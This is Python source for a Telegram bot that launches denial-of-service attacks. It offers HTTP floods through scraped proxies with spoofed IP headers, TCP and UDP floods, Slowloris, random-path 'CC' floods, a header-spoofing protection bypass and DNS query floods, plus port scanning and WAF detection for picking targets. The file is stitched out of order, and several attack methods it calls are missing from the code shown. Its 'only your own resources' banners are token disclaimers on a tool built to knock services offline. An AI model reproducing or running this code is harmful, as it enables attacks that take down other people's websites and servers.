            prompts={'http':'🎯 HTTP TSUNAMI - GET/POST флуд','tcp':'🔌 TCP STORM - соединения','udp':'📡 UDP NUKE - пакеты','slow':'🐌 SLOWLORIS - медленные запросы','cc':'🎲 CC CHAOS - случайные пути','bypass':'🔓 BYPASS MASTER - обход защит','adaptive':'🧠 AI ADAPTIVE - умная атака','minecraft':'🎮 MC CRUSHER - фейк игроки','websocket':'🌐 WS FLOOD - постоянные WS','dns':'📈 DNS AMP - амплификация','icmp':'❄️ ICMP BOMB - пинг флуд','rudy':'💀 RUDY KILLER - медленный POST','auto':'🤖 AUTO NUKE - ИИ выбор','multi':'💥 MULTI VECTOR - все методы'}
            
            await c.message.edit_text(f"{prompts[c.data]}\n⚠️ ТОЛЬКО СВОИ РЕСУРСЫ!\n\n{examples[c.data]}\n\nВведите цель:")
        
        @self.dp.message_handler(state=States.url)
        async def url_handler(m:types.Message,state:FSMContext):
            if m.from_user.id not in AUTHORIZED_USERS:return
            data=await state.get_data();t=data.get('type','http');target=m.text.strip()
            
            if t in ['auto','multi']:
                await self.special_attack_mode(m,target,t)
                await state.finish()
                return
            
            kb=InlineKeyboardMarkup(row_width=3)
            kb.add(InlineKeyboardButton("⚡LIGHT",callback_data=f"l:{t}:{target}"),InlineKeyboardButton("💥MEDIUM",callback_data=f"m:{t}:{target}"),InlineKeyboardButton("🔥HEAVY",callback_data=f"h:{t}:{target}"))
            kb.add(InlineKeyboardButton("💀EXTREME",callback_data=f"e:{t}:{target}"),InlineKeyboardButton("🌪️NUCLEAR",callback_data=f"n:{t}:{target}"),InlineKeyboardButton("⚡GODMODE",callback_data=f"g:{t}:{target}"))
            await m.reply(f"🎯 {target}\n💥 Выберите POWER:",reply_markup=kb);await state.finish()
        
        @self.dp.callback_query_handler(lambda c:c.data.startswith(("l:","m:","h:","e:","n:","g:")))
        async def power_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            p,t,target=c.data.split(":",2)
            
            configs={
                'l':{'d':30,'th':300,'desc':'LIGHT'},
                'm':{'d':60,'th':800,'desc':'MEDIUM'},
                'h':{'d':90,'th':1500,'desc':'HEAVY'},
                'e':{'d':120,'th':2500,'desc':'EXTREME'},
                'n':{'d':180,'th':4000,'desc':'NUCLEAR'},
                'g':{'d':300,'th':6000,'desc':'GODMODE'}
            }
            
            cfg=configs[p]
            
            if t in ['http','adaptive','bypass']:
                protections=await Utils.auto_detect_protection(target)
                protection_text=f"\n🛡️ Защита: {', '.join(protections) if protections else '❌ НЕТ'}"
            else:protection_text=""
            
            msg=await c.message.edit_text(f"🚀 {cfg['desc']} {t.upper()}\n🎯 {target}{protection_text}\n⚡ {cfg['th']} потоков\n⏱ {cfg['d']}с\n\n💀 ПОДГОТОВКА...")
            
            # Включаем реалтайм мониторинг
            self.monitoring=True
            monitor_task=asyncio.create_task(self.start_monitoring(c.message.chat.id))
            
            try:
                if cfg['th']>2000:
                    self.engine.target_rps=3000
                    self.engine.adaptive=True
                
                self.engine.start_time=time.time()
                await msg.edit_text(f"🚀 {cfg['desc']} {t.upper()}\n🎯 {target}{protection_text}\n⚡ {cfg['th']} потоков\n⏱ {cfg['d']}с\n\n🔥 АТАКА ИДЕТ!")
                
                if t=='http':r=await self.engine.http_flood(target,cfg['d'],cfg['th'])
                elif t=='tcp':
                    if ':' in target:h,pt=target.split(":",1);r=await self.engine.tcp_flood(h,int(pt),cfg['d'],cfg['th'])
                    else:await msg.edit_text("❌ TCP нужен формат host:port");return
                elif t=='udp':
                    if ':' in target:h,pt=target.split(":",1);r=await self.engine.udp_flood(h,int(pt),cfg['d'],cfg['th'])
                    else:await msg.edit_text("❌ UDP нужен формат host:port");return
                elif t=='slow':r=await self.engine.slowloris(target,cfg['d'],min(cfg['th'],1000))
                elif t=='cc':r=await self.engine.cc_attack(target,cfg['d'],cfg['th'])
                elif t=='bypass':r=await self.engine.bypass_attack(target,cfg['d'],cfg['th'])
                elif t=='adaptive':r=await self.engine.adaptive_flood(target,cfg['d'],cfg['th'])
                elif t=='minecraft':
                    if ':' in target:h,pt=target.split(":",1);r=await self.engine.minecraft_stress(h,int(pt),cfg['d'],cfg['th'])
                    else:await msg.edit_text("❌ MC нужен формат host:port");return
                elif t=='websocket':r=await self.engine.websocket_flood(target,cfg['d'],cfg['th'])
                elif t=='dns':h=target.split(':')[0] if ':' in target else target;r=await self.engine.dns_flood(h,cfg['d'],cfg['th'])
                elif t=='icmp':h=target.split(':')[0] if ':' in target else target;r=await self.engine.icmp_flood(h,cfg['d'],cfg['th'])
                elif t=='rudy':r=await self.engine.rudy_attack(target,cfg['d'],cfg['th'])
                
                # Останавливаем мониторинг
                self.monitoring=False
                monitor_task.cancel()
                
                self.results.append(r)
                
                effectiveness="🔥 GODLIKE!" if r.rps>2000 else "💀 BRUTAL!" if r.rps>1000 else "💥 STRONG!" if r.rps>500 else "⚡ DECENT" if r.rps>100 else "⚠️ Weak"
                
                txt=f"💀 {r.method} ЗАВЕРШЕН!\n🎯 {r.url}\n📊 {r.total:,} запросов\n✅ {r.success:,} OK ({(r.success/r.total*100):.1f}%)\n❌ {r.failed:,} FAIL\n⚡ {r.rps:,.0f} RPS\n⏱ {r.duration:.1f}с\n📤 {r.bytes_sent:,}b\n📥 {r.bytes_recv:,}b\n\n{effectiveness}"
                
                if hasattr(r,'avg_time') and r.avg_time>0:txt+=f"\n📈 Ср.время: {r.avg_time:.3f}с"
                if r.codes:
                    txt+=f"\n📋 Коды: "
                    for code,count in list(r.codes.items())[:5]:
                        emoji="✅" if 200<=code<300 else "⚠️" if 300<=code<400 else "❌"
                        txt+=f"{code}:{count} {emoji} "
                
                await msg.edit_text(txt)
                
            except Exception as e:
                self.monitoring=False
                if 'monitor_task' in locals():monitor_task.cancel()
                await msg.edit_text(f"❌ ОШИБКА: {str(e)}")
        
        @self.dp.callback_query_handler(lambda c:c.data=="stats")
        async def stats_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            if not self.results:await c.message.edit_text("📊 Нет данных атак");return
            
            total_attacks=len(self.results);total_requests=sum(r.total for r in self.results);total_success=sum(r.success for r in self.results)
            avg_rps=sum(r.rps for r in self.results)/total_attacks if total_attacks>0 else 0;latest=self.results[-1]
            
            txt=f"📊 СТАТИСТИКА РАЗРУШЕНИЯ:\n💀 Атак: {total_attacks}\n🚀 Запросов: {total_requests:,}\n✅ Успех: {total_success:,}\n⚡ Ср.RPS: {avg_rps:.0f}\n💰 Эффективность: {(total_success/total_requests*100):.1f}%\n\n🔥 ПОСЛЕДНЯЯ:\n{latest.method} ⚡ {latest.rps:.0f} RPS"
            await c.message.edit_text(txt)
        
        @self.dp.callback_query_handler(lambda c:c.data=="stop")
        async def stop_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            self.engine.stop();self.monitoring=False
            await c.message.edit_text("🛑 ВСЕ АТАКИ ОСТАНОВЛЕНЫ!")
        
        @self.dp.callback_query_handler(lambda c:c.data=="scan")
        async def scan_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            await c.message.edit_text("🔍 TARGET для анализа:");await States.config.set()
        
        @self.dp.message_handler(state=States.config)
        async def config_handler(m:types.Message,state:FSMContext):
            if m.from_user.id not in AUTHORIZED_USERS:return
            target=m.text.strip();msg=await m.reply("🔍 DEEP SCANNING...")
            
            ping=await Utils.ping(target);ports=await Utils.scan_ports(target,[21,22,23,25,53,80,110,143,443,993,995,1433,3306,3389,5432,5984,6379,8080,8443,9200,25565,25566,25567]);info=await Utils.get_info(f"http://{target}")
            
            if target.startswith('http'):protections=await Utils.auto_detect_protection(target);vulns=await Utils.vulnerability_scan(target)
            else:protections=[];vulns=[]
            
            txt=f"🔍 РАЗВЕДКА: {target}\n\n📡 Пинг: {'✅' if ping['ok'] else '❌'}\n🔌 Порты: {len([p for p,o in ports.items() if o])}/20\n"
            if 'server' in info:txt+=f"🖥 Сервер: {info['server']}\n"
            if 'technologies' in info and info['technologies']:txt+=f"💻 Технологии: {', '.join(info['technologies'][:5])}\n"
            if protections:txt+=f"🛡️ Защита: {', '.join(protections)}\n"
            if vulns:txt+=f"⚠️ Уязвимости: {len(vulns)} найдено\n"
            
            mc_ports=[p for p in [25565,25566,25567] if ports.get(p,False)]
            if mc_ports:txt+=f"🎮 Minecraft: {mc_ports}\n"
            
            await msg.edit_text(txt);await state.finish()
        
        @self.dp.callback_query_handler(lambda c:c.data=="monitor")
        async def monitor_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            self.monitoring=not self.monitoring
            status="🟢 АКТИВЕН" if self.monitoring else "🔴 СТОП"
            await c.message.edit_text(f"📈 Мониторинг: {status}")
            if self.monitoring:asyncio.create_task(self.start_monitoring(c.message.chat.id))
    
    async def special_attack_mode(self,message,target,mode):
        if mode=='auto':
            msg=await message.reply("🤖 AI АВТОМАТИКА\n🧠 Анализ цели...")
            
            if target.startswith('http'):
                protections=await Utils.auto_detect_protection(target)
                strategy="bypass" if protections else "adaptive"
                power=2000 if not protections else 1200
            else:
                strategy="tcp";power=1500
            
            await msg.edit_text(f"🤖 AI выбрал: {strategy.upper()}\n💀 МОЩНОСТЬ: {power}\n🚀 ЗАПУСК...")
            
            try:
                if strategy=='adaptive':r=await self.engine.adaptive_flood(target,120,power)
                elif strategy=='bypass':r=await self.engine.bypass_attack(target,120,power)
                elif strategy=='tcp':h,p=target.split(":");r=await self.engine.tcp_flood(h,int(p),90,power)
                
                self.results.append(r)
                await msg.edit_text(f"🤖 AI АТАКА ГОТОВА!\n💀 {r.total:,} запросов\n⚡ {r.rps:.0f} RPS")
            except Exception as e:await msg.edit_text(f"❌ AI FAIL: {e}")
        
        elif mode=='multi':
            msg=await message.reply("💥 МУЛЬТИ-ВЕКТОР\n🌪️ Запуск всех методов...")
            r=await self.engine.multi_vector_attack(target,180,800)
            self.results.append(r)
            await msg.edit_text(f"💥 МУЛЬТИ ЗАВЕРШЕН!\n💀 {r.total:,} запросов\n⚡ {r.rps:.0f} RPS")
    
    async def start_monitoring(self,chat_id):
        while self.monitoring:
            if self.engine.running:
                stats=self.engine.stats
                txt=f"📈 LIVE МОНИТОРИНГ\n⚡ Запросов: {stats['req']:,}\n✅ Успех: {stats['ok']:,}\n❌ Фейл: {stats['fail']:,}"
                try:await self.bot.send_message(chat_id,txt)
                except:pass
            await asyncio.sleep(45)
    
    def run(self):
        print("⚠️ ТОЛЬКО СВОИ РЕСУРСЫ! ⚠️");print("💀 МАКСИМАЛЬНАЯ ДЕСТРУКЦИЯ READY!")
        executor.start_polling(self.dp,skip_updates=True)

def main():
    print("="*60)
    print("⚠️  ИСПОЛЬЗУЙТЕ ТОЛЬКО НА СВОИХ РЕСУРСАХ!")
    print("   от Gustalfo")
    print("="*60)
    print("💀 УЛЬТРА МОЩНОСТЬ: 6000 ПОТОКОВ")
    print("🎮 MINECRAFT CRUSHER ДОБАВЛЕН")
    print("🌐 WEBSOCKET + DNS + ICMP + RUDY")
    print("🤖 AI АДАПТАЦИЯ + МУЛЬТИ-ВЕКТОР")
    print("🔍 15+ ИСТОЧНИКОВ ПРОКСИ")
    print("🛡️ ОБХОД ВСЕХ ЗАЩИТ")
    print("="*60)
    
    try:TelegramBot(BOT_TOKEN).run()
    except KeyboardInterrupt:print("\n🛑 Остановка...")
    except Exception as e:print(f"❌ Ошибка: {e}")

if __name__=="__main__":main()#!/usr/bin/env python3

import asyncio,aiohttp,socket,time,random,json,re,ssl,threading,struct,logging,base64,hashlib,os,sys
from dataclasses import dataclass
from typing import List,Dict
from urllib.parse import urlparse
from aiogram import Bot,Dispatcher,types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State,StatesGroup
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup,InlineKeyboardButton
from concurrent.futures import ThreadPoolExecutor

BOT_TOKEN=""
AUTHORIZED_USERS=[]

@dataclass
class Result:
    method:str;url:str;total:int;success:int;failed:int;rps:float;duration:float;codes:Dict;bytes_sent:int;bytes_recv:int;avg_time:float

class States(StatesGroup):
    url=State();config=State();custom=State()

class Engine:
    def __init__(self):
        self.running=False;self.stats={'req':0,'ok':0,'fail':0,'sent':0,'recv':0,'codes':{},'times':[],'errors':{}}
        self.proxies=[];self.working_proxies=[];self.user_agents=[];self.payloads=[];self.wordlists=[]
        self.auto_mode=False;self.target_rps=1000;self.adaptive=True
    
    async def get_proxies(self):
        sources=['https://www.proxy-list.download/api/v1/get?type=http','https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all','https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt','https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt','https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt','https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt','https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt']
        p=set()
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(8)) as s:
            for src in sources:
                try:
                    async with s.get(src) as r:
                        if r.status==200:
                            text=await r.text()
                            p.update(re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}\b',text))
                except:pass
        self.proxies=list(p)[:800];return self.proxies
    
    async def check_proxies(self,url,max_workers=150):
        if not self.proxies:await self.get_proxies()
        sem=asyncio.Semaphore(max_workers)
        async def check(p):
            async with sem:
                try:
                    c=aiohttp.ProxyConnector.from_url(f"http://{p}")
                    async with aiohttp.ClientSession(connector=c,timeout=aiohttp.ClientTimeout(4)) as s:
                        async with s.get(url,timeout=4) as r:return r.status<500
                except:return False
        tasks=[check(p) for p in random.sample(self.proxies,min(200,len(self.proxies)))]
        results=await asyncio.gather(*tasks,return_exceptions=True)
        self.working_proxies=[p for p,r in zip(self.proxies,results) if r is True]
        return self.working_proxies
    
    def generate_ua(self):
        if not self.user_agents:
            self.user_agents=[
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
                'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'
            ]
        return random.choice(self.user_agents)
    
    def generate_payload(self,size=1024):
        return json.dumps({
            'data':''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',k=size)),
            'timestamp':time.time(),'random':random.randint(1,999999),'hash':hashlib.md5(str(random.random()).encode()).hexdigest(),
            'array':[random.randint(1,1000) for _ in range(100)],'nested':{'key':random.random(),'value':'test'*100}
        })
    
    def reset(self):self.stats={'req':0,'ok':0,'fail':0,'sent':0,'recv':0,'codes':{},'times':[],'errors':{}}
    
    async def enhanced_request(self,url):
        try:
            p=random.choice(self.working_proxies) if self.working_proxies else None
            c=aiohttp.ProxyConnector.from_url(f"http://{p}") if p else None
            
            headers={
                'User-Agent':self.generate_ua(),
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate, br',
                'DNT':'1','Connection':'keep-alive','Upgrade-Insecure-Requests':'1',
                'X-Forwarded-For':'.'.join(str(random.randint(1,255)) for _ in range(4)),
                'X-Real-IP':'.'.join(str(random.randint(1,255)) for _ in range(4)),
                'X-Originating-IP':'.'.join(str(random.randint(1,255)) for _ in range(4)),
                'X-Forwarded-Host':'localhost','X-Remote-IP':'127.0.0.1',
                'CF-Connecting-IP':'.'.join(str(random.randint(1,255)) for _ in range(4)),
                'Cache-Control':random.choice(['no-cache','max-age=0','must-revalidate']),
                'Pragma':'no-cache','Referer':random.choice([url,'https://google.com','https://bing.com'])
            }
            
            method=random.choice(['GET','POST','HEAD','OPTIONS'])
            data=self.generate_payload(random.randint(100,5000)) if method=='POST' else None
            
            async with aiohttp.ClientSession(connector=c,timeout=aiohttp.ClientTimeout(12)) as s:
                t=time.time()
                async with s.request(method,url,headers=headers,data=data) as r:
                    content=await r.read()
                    rt=time.time()-t
                    self.stats['req']+=1;self.stats['ok']+=1;self.stats['times'].append(rt)
                    self.stats['codes'][r.status]=self.stats['codes'].get(r.status,0)+1
                    self.stats['recv']+=len(content)
                    if data:self.stats['sent']+=len(data.encode())
        except Exception as e:
            self.stats['req']+=1;self.stats['fail']+=1
            self.stats['errors'][str(e)[:50]]=self.stats['errors'].get(str(e)[:50],0)+1
    
    async def http_flood(self,url,dur,threads,method='GET'):
        self.running=True;self.reset();start=time.time()
        await self.check_proxies(url)
        
        async def req():
            while time.time()-start<dur and self.running:
                await self.enhanced_request(url)
                await asyncio.sleep(random.uniform(0.0001,0.001))
        
        workers=[]
        for i in range(threads):
            workers.append(asyncio.create_task(req()))
            if i%50==0:await asyncio.sleep(0.05)
        
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start;avg_time=sum(self.stats['times'])/len(self.stats['times']) if self.stats['times'] else 0
        return Result('HTTP',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,self.stats['codes'],self.stats['sent'],self.stats['recv'],avg_time)
    
    async def tcp_flood(self,host,port,dur,threads):
        self.running=True;self.reset();start=time.time()
        
        async def tcp():
            while time.time()-start<dur and self.running:
                try:
                    if random.random()<0.3:
                        r,w=await asyncio.wait_for(asyncio.open_connection(host,port),timeout=3)
                        w.close();await w.wait_closed()
                    else:
                        r,w=await asyncio.wait_for(asyncio.open_connection(host,port),timeout=5)
                        data=b'A'*random.randint(512,4096)
                        w.write(data);await w.drain();w.close();await w.wait_closed()
                        self.stats['sent']+=len(data)
                    self.stats['req']+=1;self.stats['ok']+=1
                except:self.stats['req']+=1;self.stats['fail']+=1
                await asyncio.sleep(random.uniform(0.0001,0.002))
        
        workers=[asyncio.create_task(tcp()) for _ in range(threads)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('TCP',f"{host}:{port}",self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},self.stats['sent'],0,0)
    
    async def udp_flood(self,host,port,dur,threads):
        self.running=True;self.reset();start=time.time()
        
        def udp():
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            while time.time()-start<dur and self.running:
                try:
                    size=random.choice([64,128,256,512,1024,1472,65507])
                    data=os.urandom(size)
                    s.sendto(data,(host,port))
                    self.stats['req']+=1;self.stats['ok']+=1;self.stats['sent']+=size
                except:self.stats['fail']+=1
                time.sleep(random.uniform(0.0001,0.001))
            s.close()
        
        with ThreadPoolExecutor(threads) as e:
            e.map(lambda _:udp(),range(threads))
        d=time.time()-start
        return Result('UDP',f"{host}:{port}",self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},self.stats['sent'],0,0)
    
    async def slowloris(self,url,dur,conns=500):
        self.running=True;self.reset();start=time.time()
        p=urlparse(url);host,port=p.hostname,p.port or(443 if p.scheme=='https' else 80)
        
        async def slow():
            try:
                if p.scheme=='https':
                    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
                    r,w=await asyncio.open_connection(host,port,ssl=ctx)
                else:r,w=await asyncio.open_connection(host,port)
                
                req=f"GET {p.path or '/'} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {self.generate_ua()}\r\n"
                w.write(req.encode());await w.drain()
                
                while time.time()-start<dur and self.running:
                    h=f"X-{random.randint(1000,9999)}: {os.urandom(random.randint(10,100)).hex()}\r\n"
                    w.write(h.encode());await w.drain()
                    self.stats['req']+=1;self.stats['ok']+=1
                    await asyncio.sleep(random.uniform(10,30))
                w.close();await w.wait_closed()
            except:self.stats['fail']+=1
        
        workers=[asyncio.create_task(slow()) for _ in range(conns)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('SLOWLORIS',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},0,0,0)
    
    async def cc_attack(self,url,dur,threads):
        self.running=True;self.reset();start=time.time()
        p=urlparse(url);base=f"{p.scheme}://{p.netloc}"
        
        paths=[f"/{w}" for w in ['admin','login','api','search','upload','download','config','test','dev','backup']]
        paths+=[f"/{''.join(random.choices('abcdefghijklmnopqrstuvwxyz',k=random.randint(5,15)))}" for _ in range(1000)]
        paths+=[f"/?{'&'.join([f'{random.choice(['id','page','sort','filter'])}={random.randint(1,9999)}' for _ in range(random.randint(1,5))])}" for _ in range(500)]
        
        async def cc():
            while time.time()-start<dur and self.running:
                try:
                    target=base+random.choice(paths)
                    h={'User-Agent':self.generate_ua(),'Referer':random.choice([url,'https://google.com']),'Accept-Language':random.choice(['en-US','ru-RU','de-DE'])}
                    async with aiohttp.ClientSession() as s:
                        async with s.get(target,headers=h,timeout=8) as r:
                            await r.read();self.stats['req']+=1;self.stats['ok']+=1
                            self.stats['codes'][r.status]=self.stats['codes'].get(r.status,0)+1
                except:self.stats['req']+=1;self.stats['fail']+=1
                await asyncio.sleep(random.uniform(0.001,0.01))
        
        workers=[asyncio.create_task(cc()) for _ in range(threads)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('CC',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,self.stats['codes'],0,0,0)
    
    async def bypass_attack(self,url,dur,threads):
        self.running=True;self.reset();start=time.time()
        
        bypass_techniques=[
            {'X-Originating-IP':'127.0.0.1','X-Forwarded-For':'127.0.0.1'},
            {'X-Remote-IP':'127.0.0.1','X-Remote-Addr':'127.0.0.1'},
            {'X-Client-IP':'127.0.0.1','X-Real-IP':'127.0.0.1'},
            {'X-Forwarded-Host':'localhost','X-Host':'localhost'},
            {'X-Original-URL':'/','X-Rewrite-URL':'/'},
            {'X-Forwarded-Proto':'https','X-Forwarded-Port':'443'},
            {'CF-Connecting-IP':'127.0.0.1','CF-IPCountry':'US'},
            {'X-Cluster-Client-IP':'127.0.0.1','X-ProxyUser-Ip':'127.0.0.1'}
        ]
        
        async def bp():
            while time.time()-start<dur and self.running:
                try:
                    h=random.choice(bypass_techniques).copy()
                    h.update({'User-Agent':self.generate_ua(),'Accept':random.choice(['*/*','text/html','application/json'])})
                    
                    method=random.choice(['GET','POST','HEAD','PUT','DELETE','OPTIONS','PATCH'])
                    params={'_':str(int(time.time()*1000)),'rand':random.randint(1,999999)} if random.random()<0.5 else None
                    
                    async with aiohttp.ClientSession() as s:
                        async with s.request(method,url,headers=h,params=params,timeout=8) as r:
                            await r.read();self.stats['req']+=1;self.stats['ok']+=1
                            self.stats['codes'][r.status]=self.stats['codes'].get(r.status,0)+1
                except:self.stats['req']+=1;self.stats['fail']+=1
                await asyncio.sleep(random.uniform(0.0001,0.005))
        
        workers=[asyncio.create_task(bp()) for _ in range(threads)]
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start
        return Result('BYPASS',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,self.stats['codes'],0,0,0)
    
    async def adaptive_flood(self,url,dur,base_threads):
        self.running=True;self.reset();start=time.time();current_threads=base_threads
        await self.check_proxies(url)
        
        async def adaptive_worker():
            nonlocal current_threads
            last_check=time.time()
            while time.time()-start<dur and self.running:
                if time.time()-last_check>10:
                    current_rps=self.stats['req']/(time.time()-start) if time.time()-start>0 else 0
                    if current_rps<self.target_rps*0.8 and current_threads<2000:current_threads+=50
                    elif current_rps>self.target_rps*1.2 and current_threads>50:current_threads-=25
                    last_check=time.time()
                
                await self.enhanced_request(url)
                await asyncio.sleep(0.0001)
        
        workers=[]
        for _ in range(current_threads):
            workers.append(asyncio.create_task(adaptive_worker()))
            if len(workers)%100==0:await asyncio.sleep(0.1)
        
        await asyncio.gather(*workers,return_exceptions=True)
        d=time.time()-start;avg_time=sum(self.stats['times'])/len(self.stats['times']) if self.stats['times'] else 0
        return Result('ADAPTIVE',url,self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,self.stats['codes'],self.stats['sent'],self.stats['recv'],avg_time)
    
    async def amplification_attack(self,host,port,dur,threads):
        self.running=True;self.reset();start=time.time()
        
        def amp():
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            dns_query=b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
            while time.time()-start<dur and self.running:
                try:
                    s.sendto(dns_query,(host,port))
                    self.stats['req']+=1;self.stats['ok']+=1;self.stats['sent']+=len(dns_query)
                except:self.stats['fail']+=1
                time.sleep(0.001)
            s.close()
        
        with ThreadPoolExecutor(threads) as e:
            e.map(lambda _:amp(),range(threads))
        d=time.time()-start
        return Result('AMPLIFICATION',f"{host}:{port}",self.stats['req'],self.stats['ok'],self.stats['fail'],self.stats['req']/d,d,{},self.stats['sent'],0,0)
    
    def stop(self):self.running=False

class Utils:
    @staticmethod
    async def ping(host):
        try:
            s=time.time();sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);sock.settimeout(3)
            r=sock.connect_ex((host,80));ping=(time.time()-s)*1000;sock.close()
            return {'ok':r==0,'ping':round(ping,2),'host':host}
        except Exception as e:return {'ok':False,'ping':0,'host':host,'err':str(e)}
    
    @staticmethod
    async def scan_ports(host,ports):
        r={}
        for p in ports:
            try:s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(1);r[p]=s.connect_ex((host,p))==0;s.close()
            except:r[p]=False
        return r
    
    @staticmethod
    async def get_info(url):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url,timeout=10) as r:
                    return {'status':r.status,'server':r.headers.get('Server','?'),'type':r.headers.get('Content-Type','?'),'headers':dict(r.headers)}
        except Exception as e:return {'err':str(e)}
    
    @staticmethod
    async def auto_detect_protection(url):
        protections=[]
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url,timeout=10) as r:
                    headers=dict(r.headers)
                    content=await r.text()
                    
                    if 'cloudflare' in headers.get('Server','').lower() or 'cf-ray' in headers:protections.append('Cloudflare')
                    if 'x-sucuri-id' in headers:protections.append('Sucuri')
                    if 'x-cache' in headers:protections.append('CDN')
                    if 'x-frame-options' in headers:protections.append('Anti-Frame')
                    if any(x in content.lower() for x in ['ddos','protection','checking']):protections.append('DDoS-Guard')
                    
        except:pass
        return protections
    
    @staticmethod
    async def vulnerability_scan(url):
        vulns=[]
        try:
            dirs=['admin','backup','config','test','dev','api','upload','temp']
            async with aiohttp.ClientSession() as s:
                for d in dirs:
                    try:
                        async with s.get(f"{url}/{d}",timeout=5) as r:
                            if r.status==200:vulns.append(f"Open directory: /{d}")
                    except:pass
        except:pass
        return vulns

class TelegramBot:
    def __init__(self,token):
        self.bot=Bot(token);self.dp=Dispatcher(self.bot,storage=MemoryStorage());self.engine=Engine();self.results=[]
        self.auto_attacks={};self.monitoring=False;self.setup()
    
    def setup(self):
        @self.dp.message_handler(commands=['start'])
        async def start(m:types.Message):
            if m.from_user.id not in AUTHORIZED_USERS:await m.reply("❌ НЕТ ДОСТУПА!");return
            kb=InlineKeyboardMarkup(row_width=3)
            kb.add(InlineKeyboardButton("🎯HTTP",callback_data="http"),InlineKeyboardButton("🔌TCP",callback_data="tcp"),InlineKeyboardButton("📡UDP",callback_data="udp"))
            kb.add(InlineKeyboardButton("🐌SLOW",callback_data="slow"),InlineKeyboardButton("🎲CC",callback_data="cc"),InlineKeyboardButton("🔓BYPASS",callback_data="bypass"))
            kb.add(InlineKeyboardButton("🧠ADAPTIVE",callback_data="adaptive"),InlineKeyboardButton("📈AMP",callback_data="amp"),InlineKeyboardButton("🤖AUTO",callback_data="auto"))
            kb.add(InlineKeyboardButton("📊STATS",callback_data="stats"),InlineKeyboardButton("🛑STOP",callback_data="stop"),InlineKeyboardButton("🔍SCAN",callback_data="scan"))
            kb.add(InlineKeyboardButton("🛡️DETECT",callback_data="detect"),InlineKeyboardButton("⚙️CUSTOM",callback_data="custom"),InlineKeyboardButton("📈MONITOR",callback_data="monitor"))
            await m.reply("Не использовать во вред ⚠️\n🚀 МАКСИМАЛЬНАЯ МОЩНОСТЬ\n🤖 Выберите атаку:",reply_markup=kb)
        
        @self.dp.callback_query_handler(lambda c:c.data in["http","tcp","udp","slow","cc","bypass","adaptive","amp","auto"])
        async def attack_type(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            await States.url.set()
            state=self.dp.current_state(chat=c.message.chat.id,user=c.from_user.id)
            await state.update_data(type=c.data)
